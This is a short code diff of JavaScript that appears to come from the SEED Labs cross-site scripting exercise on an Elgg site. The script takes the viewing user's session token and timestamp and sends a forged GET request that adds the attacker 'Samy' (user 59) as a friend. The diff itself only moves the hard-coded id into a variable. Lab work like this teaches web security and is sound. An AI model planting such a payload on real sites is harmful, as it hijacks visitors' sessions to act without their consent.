@@ -5,9 +5,11 @@
 		var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 		//Construct the HTTP request to add Samy as a friend.
 
-		var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + ts + token + token;
+		var samy_id= 59;
 
-		if (elgg.session.user.guid != 59) {
+		var sendurl = "http://www.seed-server.com/action/friends/add?friend="+samy_id + ts + ts + token + token;
+
+		if (elgg.session.user.guid != samy_id) {
 			//Create and send Ajax request to add friend
 			Ajax = new XMLHttpRequest();
 			Ajax.open("GET", sendurl, true);
